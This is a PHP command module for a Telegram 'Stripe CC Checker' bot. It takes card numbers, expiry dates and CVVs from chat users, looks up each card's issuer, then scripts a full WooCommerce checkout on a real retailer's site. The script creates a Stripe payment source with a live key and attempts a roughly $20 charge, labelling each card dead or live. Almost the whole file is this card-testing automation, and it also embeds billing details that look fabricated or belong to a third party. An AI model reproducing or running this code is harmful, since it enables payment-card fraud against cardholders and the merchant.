<?php

/*

///==[Stripe CC Checker Commands]==///

/ss creditcard - Checks the Credit Card

*/


include __DIR__."/../config/config.php";
include __DIR__."/../config/variables.php";
include_once __DIR__."/../functions/bot.php";
include_once __DIR__."/../functions/db.php";
include_once __DIR__."/../functions/functions.php";


////////////====[MUTE]====////////////
if(strpos($message, "/chg ") === 0 || strpos($message, ".chg ") === 0){   
    $antispam = antispamCheck($userId);
    addUser($userId);
    
    if($antispam != False){
      bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"[<u>ANTI SPAM</u>] Try again after <b>$antispam</b>s.",
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id
      ]);
      return;

    }else{
        $messageidtoedit1 = bot('sendmessage',[
          'chat_id'=>$chat_id,
          'text'=>"<b>Wait for Result...</b>",
          'parse_mode'=>'html',
          'reply_to_message_id'=> $message_id

        ]);

        $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
        $lista = substr($message, 4);
        $bin = substr($cc, 0, 6);
        
        if(preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)) {
            $creditcard = $matches[0][0];
            $cc = multiexplode(array(":", "|", "/", " "), $creditcard)[0];
            $mm = multiexplode(array(":", "|", "/", " "), $creditcard)[1];
            $yy = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
            $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];
        

##########################################################CHECKER PART#######################################################  

            /////////////////////////////////////////////////////////////////////////////////////
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: lookup.binlist.net',
            'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, '');
            $fim = curl_exec($ch);
            $bank = capture($fim, '"bank":{"name":"', '"');
            $cname = capture($fim, '"name":"', '"');
            $brand = capture($fim, '"brand":"', '"');
            $country = capture($fim, '"country":{"name":"', '"');
            $phone = capture($fim, '"phone":"', '"');
            $scheme = capture($fim, '"scheme":"', '"');
            $type = capture($fim, '"type":"', '"');
            $emoji = capture($fim, '"emoji":"', '"');
            $currency = capture($fim, '"currency":"', '"');
            $binlenth = strlen($bin);
            $schemename = ucfirst("$scheme");
            $typename = ucfirst("$type");
            
            
            /////////////////////==========[Unavailable if empty]==========////////////////
            
            
            if (empty($schemename)) {
            	$schemename = "Unavailable";
            }
            if (empty($typename)) {
            	$typename = "Unavailable";
            }
            if (empty($brand)) {
            	$brand = "Unavailable";
            }
            if (empty($bank)) {
            	$bank = "Unavailable";
            }
            if (empty($cname)) {
            	$cname = "Unavailable";
            }
            if (empty($phone)) {
            	$phone = "Unavailable";
            }
            ///////////////////////////////////////////////////////////////////////////////////////////////////////
            error_reporting(0);
            ##################################
            if(!is_dir("lawcookies")){
                mkdir("lawcookies", 0755);
            }
            define("capture", getcwd()."/lawcookies/coo".rand(1100, 9999).".txt");
            
            #------[Email Generator]------#
            function emailGenerate($length = 10)
            {
                $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
                $charactersLength = strlen($characters);
                $randomString     = '';
                for ($i = 0; $i < $length; $i++) {
                    $randomString .= $characters[rand(0, $charactersLength - 1)];
                }
                return $randomString . '@gmail.com';
            }
            $email = emailGenerate();
##################################

$curl = curl_init();

$headers = array();
$headers[] = 'Host: www.24bottles.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0';
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Origin: https://www.24bottles.com';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://www.24bottles.com/shop/24bottles-x-whatevs-kids-bottle/?attribute_pa_size=250ml';
$postfield = 'attribute_pa_size=250ml&quantity=1&gtm4wp_id=160892&gtm4wp_name=24Bottles+x+Whatevs.+-+Kids+Bottle&gtm4wp_sku=160892&gtm4wp_category=New+Arrivals&gtm4wp_price=19.9&gtm4wp_stocklevel=&add-to-cart=160892&product_id=160892&variation_id=160893&_wp_http_referer=https://www.24bottles.com/shop/24bottles-x-whatevs-kids-bottle/?attribute_pa_size=250ml';

curl_setopt_array($curl, [
   CURLOPT_URL => 'https://www.24bottles.com/shop/24bottles-x-whatevs-kids-bottle/?attribute_pa_size=250ml',
   CURLOPT_POST => 1,
   CURLOPT_POSTFIELDS => $postfield,
   CURLOPT_HTTPHEADER => $headers,
   CURLOPT_FOLLOWLOCATION => 1,
   CURLOPT_RETURNTRANSFER => 1,
   CURLOPT_SSL_VERIFYPEER => 0,
   CURLOPT_SSL_VERIFYHOST => 0,
   CURLOPT_COOKIEFILE => capture,
   CURLOPT_COOKIEJAR => capture,
]);
$exe = curl_exec($curl);
##################################
$curl = curl_init();

$headers = array();
$headers[] = 'Host: www.24bottles.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://www.24bottles.com/shop/24bottles-x-whatevs-kids-bottle/?attribute_pa_size=250ml';
$headers[] = 'Upgrade-Insecure-Requests: 1';

curl_setopt_array($curl, [
   CURLOPT_URL => 'https://www.24bottles.com/cart/',
   CURLOPT_CUSTOMREQUEST => 'GET',
   CURLOPT_HTTPHEADER => $headers,
   CURLOPT_FOLLOWLOCATION => 1,
   CURLOPT_RETURNTRANSFER => 1,
   CURLOPT_SSL_VERIFYPEER => 0,
   CURLOPT_SSL_VERIFYHOST => 0,
   CURLOPT_COOKIEFILE => capture,
   CURLOPT_COOKIEJAR => capture,
]);
$exe2 = curl_exec($curl);
##################################
$curl = curl_init();

$headers = array();
$headers[] = 'Host: www.24bottles.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://www.24bottles.com/cart/';
$headers[] = 'Upgrade-Insecure-Requests: 1';

curl_setopt_array($curl, [
   CURLOPT_URL => 'https://www.24bottles.com/checkout/',
   CURLOPT_CUSTOMREQUEST => 'GET',
   CURLOPT_HTTPHEADER => $headers,
   CURLOPT_FOLLOWLOCATION => 1,
   CURLOPT_RETURNTRANSFER => 1,
   CURLOPT_SSL_VERIFYPEER => 0,
   CURLOPT_SSL_VERIFYHOST => 0,
   CURLOPT_COOKIEFILE => capture,
   CURLOPT_COOKIEJAR => capture,
]);
$exe3 = curl_exec($curl);
$nonce = t(st(g($exe3, '<input type="hidden" id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="','"')));
$security = t(st(g($exe3, '"update_order_review_nonce":"','"')));
##################################
$curl = curl_init();

$headers = array();
$headers[] = 'Host: www.24bottles.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0';
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Origin: https://www.24bottles.com';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://www.24bottles.com/checkout/';
$postfield = 'security='.$security.'&payment_method=stripe&country=US&state=&postcode=&city=&address=&address_2=&s_country=US&s_state=&s_postcode=&s_city=&s_address=&s_address_2=&has_full_address=false&post_data=billing_first_name%3DArceus%26billing_last_name%3DOp%26billing_company%3D%26billing_country%3DUS%26billing_address_1%3D%26billing_address_2%3D%26billing_city%3D%26billing_state%3D%26billing_postcode%3D%26billing_phone%3D%26billing_email%3D%26shipping_first_name%3D%26shipping_last_name%3D%26shipping_company%3D%26shipping_country%3DPH%26shipping_address_1%3D%26shipping_address_2%3D%26shipping_city%3D%26shipping_state%3D%26shipping_postcode%3D%26payment_method%3Dstripe%26woocommerce-process-checkout-nonce%3D38e02f330b%26_wp_http_referer%3D%252F%253Fwc-ajax%253Dupdate_order_review%26terms-field%3D1%26woocommerce-process-checkout-nonce%3D38e02f330b%26_wp_http_referer%3D%252F%253Fwc-ajax%253Dupdate_order_review';

curl_setopt_array($curl, [
   CURLOPT_URL => 'https://www.24bottles.com/?wc-ajax=update_order_review',
   CURLOPT_POST => 1,
   CURLOPT_POSTFIELDS => $postfield,
   CURLOPT_HTTPHEADER => $headers,
   CURLOPT_FOLLOWLOCATION => 1,
   CURLOPT_RETURNTRANSFER => 1,
   CURLOPT_SSL_VERIFYPEER => 0,
   CURLOPT_SSL_VERIFYHOST => 0,
   CURLOPT_COOKIEFILE => capture,
   CURLOPT_COOKIEJAR => capture,
]);
$exe4 = curl_exec($curl);
##################################
$curl = curl_init();

$headers = array();
$headers[] = 'Host: www.24bottles.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0';
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Origin: https://www.24bottles.com';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://www.24bottles.com/checkout/';
$postfield = 'security='.$security.'&payment_method=stripe&country=US&state=CA&postcode=95656&city=Hayward&address=26517+Danti+Court&address_2=&s_country=US&s_state=CA&s_postcode=95656&s_city=Hayward&s_address=26517+Danti+Court&s_address_2=&has_full_address=true&post_data=billing_first_name%3DArceus%26billing_last_name%3DOp%26billing_company%3D%26billing_country%3DUS%26billing_address_1%3D26517%2BDanti%2BCourt%26billing_address_2%3D%26billing_city%3DHayward%26billing_state%3DCA%26billing_postcode%3D95656%26billing_phone%3D650-8730750%26billing_email%3Dalterx82%2540gmail.com%26shipping_first_name%3D%26shipping_last_name%3D%26shipping_company%3D%26shipping_country%3DPH%26shipping_address_1%3D%26shipping_address_2%3D%26shipping_city%3D%26shipping_state%3D%26shipping_postcode%3D%26payment_method%3Dstripe%26woocommerce-process-checkout-nonce%3D38e02f330b%26_wp_http_referer%3D%252F%253Fwc-ajax%253Dupdate_order_review%26terms-field%3D1%26woocommerce-process-checkout-nonce%3D'.$nonce.'%26_wp_http_referer%3D%252F%253Fwc-ajax%253Dupdate_order_review';

curl_setopt_array($curl, [
   CURLOPT_URL => 'https://www.24bottles.com/?wc-ajax=update_order_review',
   CURLOPT_POST => 1,
   CURLOPT_POSTFIELDS => $postfield,
   CURLOPT_HTTPHEADER => $headers,
   CURLOPT_FOLLOWLOCATION => 1,
   CURLOPT_RETURNTRANSFER => 1,
   CURLOPT_SSL_VERIFYPEER => 0,
   CURLOPT_SSL_VERIFYHOST => 0,
   CURLOPT_COOKIEFILE => capture,
   CURLOPT_COOKIEJAR => capture,
]);
$exe5 = curl_exec($curl);
##################################
$curl = curl_init();

$headers = array();
$headers[] = 'Host: api.stripe.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0';
$headers[] = 'Accept: application/json';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://js.stripe.com';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://js.stripe.com/';
$postfield = 'type=card&owner[name]=Arceus+Op&owner[address][line1]=26517+Danti+Court&owner[address][state]=CA&owner[address][city]=Hayward&owner[address][postal_code]=95656&owner[address][country]=US&owner[email]=alterx82%40gmail.com&owner[phone]=650-8730750&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'&guid=2d32d4c0-6c4d-4c14-9926-6fe6f71aad341121e6&muid=7bbbb4ef-3d80-4948-8019-4f1dd4511ca0db63e8&sid=932d5d62-1429-4119-ad1f-2f742e5f04a6d12c3e&pasted_fields=number&payment_user_agent=stripe.js%2F56599e29d%3B+stripe-js-v3%2F56599e29d&time_on_page=355882&key=pk_live_eyay50DW6EEJjEyX3Wjlcra0';

curl_setopt_array($curl, [
   CURLOPT_URL => 'https://api.stripe.com/v1/sources',
   CURLOPT_POST => 1,
   CURLOPT_POSTFIELDS => $postfield,
   CURLOPT_HTTPHEADER => $headers,
   CURLOPT_FOLLOWLOCATION => 1,
   CURLOPT_RETURNTRANSFER => 1,
   CURLOPT_SSL_VERIFYPEER => 0,
   CURLOPT_SSL_VERIFYHOST => 0,
   CURLOPT_COOKIEFILE => capture,
   CURLOPT_COOKIEJAR => capture,
]);
$exe6 = curl_exec($curl);
$source = t(st(g($exe6, '"id": "','"')));
##################################
$curl = curl_init();

$headers = array();
$headers[] = 'Host: www.24bottles.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0';
$headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Origin: https://www.24bottles.com';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://www.24bottles.com/checkout/';
$postfield = 'billing_first_name=Arceus&billing_last_name=Op&billing_company=&billing_country=US&billing_address_1=26517+Danti+Court&billing_address_2=&billing_city=Hayward&billing_state=CA&billing_postcode=95656&billing_phone=650-8730750&billing_email=alterx82%40gmail.com&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=PH&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&payment_method=stripe&shipping_method%5B0%5D=flat_rate%3A2&woocommerce-process-checkout-nonce=38e02f330b&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&terms=on&terms-field=1&shipping_method%5B0%5D=flat_rate%3A2&woocommerce-process-checkout-nonce='.$nonce.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&stripe_source='.$source.'';

curl_setopt_array($curl, [
   CURLOPT_URL => 'https://www.24bottles.com/?wc-ajax=checkout',
   CURLOPT_POST => 1,
   CURLOPT_POSTFIELDS => $postfield,
   CURLOPT_HTTPHEADER => $headers,
   CURLOPT_FOLLOWLOCATION => 1,
   CURLOPT_RETURNTRANSFER => 1,
   CURLOPT_SSL_VERIFYPEER => 0,
   CURLOPT_SSL_VERIFYHOST => 0,
   CURLOPT_COOKIEFILE => capture,
   CURLOPT_COOKIEJAR => capture,
]);
$exe7 = curl_exec($curl);
$msg = st(json_decode($exe7, 1)['messages']);
$url1 = t(st(g($exe7, '"redirect":"','"')));
$url = stripslashes("$url1");
$info = curl_getinfo($ch);
$time = $info['total_time'];
$time = substr_replace($time, '',4);
######################END OF CHECKER PART################################################################################
            
            
            if(strpos($exe7, '#response=')) {
              addTotal();
              addUserTotal($userId);
              addCVV();
              addUserCVV($userId);
              addCCN();
              addUserCCN($userId);
              bot('editMessageText',[
                'chat_id'=>$chat_id,
                'message_id'=>$messageidtoedit,
                  'text'=>"<b>Card:</b> <code>$lista</code>
  <b>Status -» Dead ❌
  Response -» EXPIRED CARD OR SOMEOTHER SHIT
  Gateway -» Stripe 20$ Chrg
  Time -» <b>$time</b><b>s</b>
  
  ------- Bin Info -------</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $schemename
<b>Type -»</b> $typename
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/Arceus69_Xd'>[ ＡＲＣ Σ ＵＳ </Oғғʟɪɴᴇ> ]</a></b>",
                'parse_mode'=>'html',
                'disable_web_page_preview'=>'true'
                
            ]);}
            
            elseif(strpos($exe7, 'The card has insufficient funds to complete the purchase.')) {
                addTotal();
                addUserTotal($userId);
                bot('editMessageText',[
                  'chat_id'=>$chat_id,
                  'message_id'=>$messageidtoedit,
                  bot('editMessageText',[
                    'chat_id'=>$chat_id,
                    'message_id'=>$messageidtoedit,
                    'text'=>"<b>Card:</b> <code>$lista</code>
    <b>Status -» CVV Matched [Credit Floor] ✅
    Response -» Approved (Insufficient Funds)
    Gateway -» Stripe 20$ Chrg
    Time -» <b>$time</b><b>s</b>
  
  ------- Bin Info -------</b>
  <b>Bank -»</b> $bank
  <b>Brand -»</b> $schemename
  <b>Type -»</b> $typename
  <b>Currency -»</b> $currency
  <b>Country -»</b> $cname ($emoji - 💲$currency)
  <b>Issuers Contact -»</b> $phone
  <b>----------------------------</b>
  
  <b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
  <b>Bot By: <a href='t.me/Arceus69_Xd'>[ ＡＲＣ Σ ＵＳ </Oғғʟɪɴᴇ> ]</a></b>",
                  'parse_mode'=>'html',
                  'disable_web_page_preview'=>'true'
                  
              ]);}
              elseif((substr_count($exe7, '"result":"success"') > 0) || (substr_count($exe7, '"redirect":"https"'))){
                addTotal();
                addUserTotal($userId);
                bot('editMessageText',[
                  'chat_id'=>$chat_id,
                  'message_id'=>$messageidtoedit,
                  bot('editMessageText',[
                    'chat_id'=>$chat_id,
                    'message_id'=>$messageidtoedit,
                    'text'=>"<b>Card:</b> <code>$lista</code>
    <b>Status -» CVV Matched [PAYMENT SUCCESS] ✅
    Response -» Approved (CHARGED 20$)
    Gateway -» Stripe 20$ Chrg
    Response -» Proxy ($ip)
    Time -» <b>$time</b><b>s</b>
  
  ------- Bin Info -------</b>
  <b>Bank -»</b> $bank
  <b>Brand -»</b> $schemename
  <b>Type -»</b> $typename
  <b>Currency -»</b> $currency
  <b>Country -»</b> $cname ($emoji - 💲$currency)
  <b>Issuers Contact -»</b> $phone
  <b>----------------------------</b>
  
  <b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
  <b>Bot By: <a href='t.me/Arceus69_Xd'>[ ＡＲＣ Σ ＵＳ </Oғғʟɪɴᴇ> ]</a></b>",
                  'parse_mode'=>'html',
                  'disable_web_page_preview'=>'true'
                  
              ]);}

              else{
                addTotal();
                addUserTotal($userId);
                bot('editMessageText',[
                  'chat_id'=>$chat_id,
                  'message_id'=>$messageidtoedit,
                  'text'=>"<b>Card:</b> <code>$lista</code>
  <b>Status -» Dead ❌
  Response -» Card Was Declined
  Gateway -» Stripe 20$ Chrg
  Time -» <b>$time</b><b>s</b>
  
  ------- Bin Info -------</b>
  <b>Bank -»</b> $bank
  <b>Brand -»</b> $schemename
  <b>Type -»</b> $typename
  <b>Currency -»</b> $currency
  <b>Country -»</b> $cname ($emoji - 💲$currency)
  <b>Issuers Contact -»</b> $phone
  <b>----------------------------</b>
  
  <b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
  <b>Bot By: <a href='t.me/Mabidax_The_Lost_Noob'>Mabidax</a></b>",
                  'parse_mode'=>'html',
                  'disable_web_page_preview'=>'true'
                  
              ]);}
            
        }else{
          bot('editMessageText',[
              'chat_id'=>$chat_id,
              'message_id'=>$messageidtoedit,
              'text'=>"<b>Cool! Fucking provide a CC to Check!!</b>",
              'parse_mode'=>'html',
              'disable_web_page_preview'=>'true'
              
          ]);
      }
    }
}


?>